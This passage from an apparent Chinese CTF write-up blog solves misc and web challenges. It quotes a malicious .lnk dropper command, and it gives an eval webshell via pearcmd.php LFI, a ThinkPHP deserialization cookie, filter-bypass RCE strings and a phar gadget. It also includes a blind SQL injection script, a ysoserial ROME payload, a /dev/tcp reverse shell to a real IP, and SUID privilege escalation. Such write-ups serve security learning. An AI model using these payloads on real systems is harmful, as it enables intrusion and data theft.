href="https://www.cnblogs.com/hed10ne/p/15841253.html">https://www.cnblogs.com/hed10ne/p/15841253.html</a></p><blockquote><p>目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符</p></blockquote><p>读取完整命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> win32com.client <span class="comment"># pip install pywin32</span></span><br><span class="line"></span><br><span class="line">shell = win32com.client.Dispatch(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">shortcut = shell.CreateShortCut(<span class="string">&quot;20200308-sitrep-48-covid-19.pdf.lnk&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Targetpath)</span><br><span class="line"><span class="built_in">print</span>(shortcut.Arguments)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS D:\python3<span class="number">.8</span>\code&gt; python -u <span class="string">&quot;d:\python3.8\code\0.py&quot;</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line">/c copy <span class="string">&quot;strange2.pdf.lnk&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp /y&amp;<span class="keyword">for</span> /r C:\\Windows\\System32\\ %i <span class="keyword">in</span> (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&amp;findstr.exe <span class="string">&quot;TVNDRgAAAA&quot;</span> %tmp%\\g5ZokyumBB2gDn.tmp&gt;%tmp%\\cSi1r0uywDNvDu.tmp&amp;%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&amp;expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &amp;wscript %tmp%\\9sOXN6Ltf0afe7.js</span><br></pre></td></tr></table></figure><p><code>oGhPGUDC03tURV.tmp</code>的文件头是MSCF，是微软的.cab压缩文件格式</p><p><img src="/../images/image-20221020131408248-1686150281425.png" alt="image-20221020131408248"></p><p>使用命令<code>expand %tmp%\\oGhPGUDC03tURV.tmp -F:* 解压路径</code>得到</p><p><img src="/../images/image-20221020131537014-1686150281425.png" alt="image-20221020131537014"></p><p>flag在flag.txt中</p><p>js脚本</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e7926b8de13327f8e703624e = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);e7926b8de13327f8e703624e.<span class="property">Run</span> (<span class="string">&quot;cmd /c mkdir %tmp%\\flag&amp;&amp;move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&amp;\&quot;%tmp%\\strange2.pdf\&quot;&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="Yesec-no-drumsticks-5"><a href="#Yesec-no-drumsticks-5" class="headerlink" title="Yesec no drumsticks 5"></a>Yesec no drumsticks 5</h3><h4 id="git工作原理"><a href="#git工作原理" class="headerlink" title="git工作原理"></a>git工作原理</h4><img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" /><ul><li>workspace：工作区–本地目录（比如我<code>git init Test</code>创建了一个空仓库，那么<code>Test</code>这个目录就是workspace）</li><li>staging area：暂存区&#x2F;缓存区–.git目录下的index文件（<code>git add</code> 或者<code>git stash</code>）</li><li>local repository：版本库或本地仓库–.git目录下的objects目录</li><li>remote repository：远程仓库–github</li></ul><p>以本题为例，其<code>.git</code>目录如下</p><p><img src="/../images/image-20221020162618015-1686150281425.png" alt="image-20221020162618015"></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><img src="/../images/image-20221020163752820-1686150281425.png" alt="image-20221020163752820"></p><p>index中有flag.txt文件</p><p>恢复缓存工作区<code>git stash pop</code></p><p><img src="/../images/image-20221020163917173-1686150281426.png" alt="image-20221020163917173"></p><p>回滚<code>git reset --hard commit_id</code>后，读取flag.txt得到<code>flag&#123;Yesec#1s#c@ibi&#125;</code></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>源码泄露</p><ol><li><p>git回滚</p><p>查看历史版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p>回滚到历史版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure><blockquote><p>实际上就是将HEAD指向commit_id</p></blockquote></li><li><p>git缓存</p><p>将当前工作区缓存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash</span><br></pre></td></tr></table></figure><p>恢复缓存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>回滚到缓存版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard commit_id</span><br></pre></td></tr></table></figure></li></ol><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="ezapi"><a href="#ezapi" class="headerlink" title="ezapi"></a>ezapi</h4><p>graphql</p><p>漏洞：<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p><p>使用语法：<a href="https://blog.csdn.net/weixin_39130261/article/details/118547853">https://blog.csdn.net/weixin_39130261/article/details/118547853</a></p><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地文件包含（LFI）绕过后缀名添加，使用pearcmd.php绕过。</p><p>p神的文章：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p><blockquote><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。(类似于python中的pip)在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p><p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>pear中有一个命令config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p>然后一句话木马就会被写入&#x2F;tmp&#x2F;hello.php中，我们只需包含这个文件即可。</p><h4 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h4><p>5.1.41LTS ThinkPHP框架反序列化漏洞<a href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p><p>这道题反序列化点在cookie中</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:</span><br><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;id=whoami</span><br><span class="line">    </span><br><span class="line">?dajs=ls</span><br></pre></td></tr></table></figure><p>flag在环境变量里。</p><h3 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h3><h4 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了很多。主要是</p><ul><li><p>关键词绕过</p><p>通配符，插入空字符绕过等等</p></li><li><p>；绕过</p><p>%0a或者&amp;&amp;绕过</p></li><li><p>&#x2F;绕过</p><p><code>ls /</code> &#x3D;&#x3D; <code>cd 路径；ls</code></p><p>返回上级目录 <code>cd ..</code></p></li><li><p>空格绕过</p><p><code>$&#123;IFS&#125;</code>等等</p></li></ul><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=cd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>acd$&#123;IFS&#125;..%<span class="number">0</span>aca$<span class="number">1</span>t$&#123;IFS&#125;ffff$<span class="number">1</span>llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="BabySSTI-Two"><a href="#BabySSTI-Two" class="headerlink" title="BabySSTI_Two"></a>BabySSTI_Two</h4><p>unicode编码绕过，catch_warnings被过滤，换一个类比如os._wrap_close就好了。</p><h4 id="UnserializeThree"><a href="#UnserializeThree" class="headerlink" title="UnserializeThree"></a>UnserializeThree</h4><p>考点：phar反序列化，#绕过</p><p>文件上传给出上传后文件路径</p><p>注释中提示class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>#绕过</p><ol><li>闭合php标签</li><li>\n</li><li>\r</li></ol><p>这里只能用\r。</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;\rsystem(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="comment">//Same point ,can you bypass me again?</span></span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;#&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>.<span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的phar改图片后缀名上传后，在class.php下用phar协议访问（只要是phar文件，后缀名是什么都可以解析）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">class</span>.php?file=phar:<span class="comment">//file_path</span></span><br></pre></td></tr></table></figure><h4 id="又一个SQL"><a href="#又一个SQL" class="headerlink" title="又一个SQL"></a>又一个SQL</h4><p>0^0和0^1，回显两种情况，猜测使用盲注。</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#数字</span></span><br><span class="line"><span class="comment">#0^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)</span></span><br><span class="line"><span class="comment">#单引号</span></span><br><span class="line"><span class="comment">#0&#x27; or (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SqlBlind</span>():</span><br><span class="line"></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line"><span class="comment">#wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment">#where(user=&#x27;f1ag_is_here&#x27;)</span></span><br><span class="line">            params=&#123;</span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;c&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;comment&#x27;:&quot;hack&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_information&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                 <span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 请求方式</span></span><br><span class="line">            <span class="comment">#r=requests.get(url=url,params=params)</span></span><br><span class="line">            r=requests.post(url=url,data=params)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 防止429</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#r=requests.get(url=url2)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 编码</span></span><br><span class="line">            <span class="comment">#r=str(r.json())</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># True的标志  0的个数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;好耶&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># if r.text.count(&#x27;0&#x27;)==i:</span></span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line"></span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &lt;=<span class="number">32</span> <span class="keyword">or</span> right &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>,result)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    SqlBlind()</span><br></pre></td></tr></table></figure><h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/*    */</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerController</span></span><br><span class="line"><span class="comment">/*    */</span> &#123;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 19 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do you like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">(<span class="meta">@RequestParam</span> String EXP)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">/* 24 */</span>     <span class="keyword">if</span> (EXP.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">/* 25 */</span>       <span class="keyword">return</span> <span class="string">&quot;Do you know Rome Serializer?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/* 27 */</span>     <span class="type">byte</span>[] exp = Base64.getDecoder().decode(EXP);</span><br><span class="line"><span class="comment">/* 28 */</span>     <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line"><span class="comment">/* 29 */</span>     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">/* 30 */</span>     objectInputStream.readObject();</span><br><span class="line"><span class="comment">/* 31 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do You like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span> &#125;</span><br></pre></td></tr></table></figure><p>反序列化点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>ROME反序列化分析</p><p><a href="https://www.yulate.com/292.html">https://www.yulate.com/292.html</a></p><blockquote><p>java版本要jdk8u-121照着文章本地复现了，但是用ysoserial写了反弹shell，题目的发送过去不可以</p></blockquote><p>这周发现只要把payload拿去url编码后就可以了。</p><p>这里思考了得出的结果是</p><blockquote><p>RFC3986中指定了以下字符为保留字符：! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>　　不安全字符：还有一些字符，当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符，原因有很多。</p><ul><li>空格：Url 在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。</li><li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔Url的作用</li><li>#：通常用于表示书签或者锚点</li><li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码</li><li>{}|^[]&#96;~：某一些网关或者传输代理会篡改这些字符</li></ul></blockquote><p>而base64加密后可能会出现<code>+,/,=</code></p><p>解题步骤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>xxx为base64后的<code>bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</code></p><p>这里<code>&gt; 1.txt</code>是因为如果我加了<code>|base64</code>生成了之后会出现其他符号</p><p><img src="/../images/image-20221018174601257-1686150281426.png" alt="image-20221018174601257"></p><p>用python或者cyberchef来base64加密</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXP=对上面生成的base64再进行url编码</span><br></pre></td></tr></table></figure><p>连接后flag在根目录</p><p><img src="/../images/image-20221018174256886-1686150281426.png" alt="image-20221018174256886"></p><h3 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h3><h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>直接利用<code>&gt;</code>写入木马，然后一开始使用蚁剑连接</p><p>读取根目录下的start.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo $FLAG &gt; /ffll444aaggg &amp;&amp; export FLAG=not &amp;&amp; FLAG=not &amp;&amp; chmod 700 /ffll444aaggg &amp;&amp; \</span><br><span class="line">service apache2 restart &amp;&amp; \</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>这里<code>chmod 700 /ffll444aaggg</code>的意思就是&#x2F;ffll444aaggg只有root用户可以访问。</p><p>然后第一个想到的就是用suid提权，因为之前哪一周的misc是用到了这个知识点。</p><p>但是没有想到的是蚁剑的终端太不好用了（其实我之前觉得蚁剑挺强的，因为它自带那些绕过插件）</p><p>比如变量赋值没用</p><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019102635-1686150281426.png" alt="QQ图片20221019102635"></p><p>查找具有suid的命令没用</p><p><img src="/../images/image-20221019102841851-1686150281426.png" alt="image-20221019102841851"></p><p>反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@out:/$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/date</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line"></span><br><span class="line">www-data@out:/$ date -f ffll444aaggg</span><br><span class="line">date -f ffll444aaggg</span><br><span class="line">date: invalid date &#x27;flag&#123;1f005b40-39e2-4538-8816-3e27bdd98352&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019103452-1686150281426.png" alt="QQ图片20221019103452"></p><h4 id="final-round"><a href="#final-round" class="headerlink" title="final round"></a>final round</h4><p>时间盲注</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 5</title>
      <link href="/2023/05/31/NSSRound5/"/>
      <url>/2023/05/31/NSSRound5/</url>
      
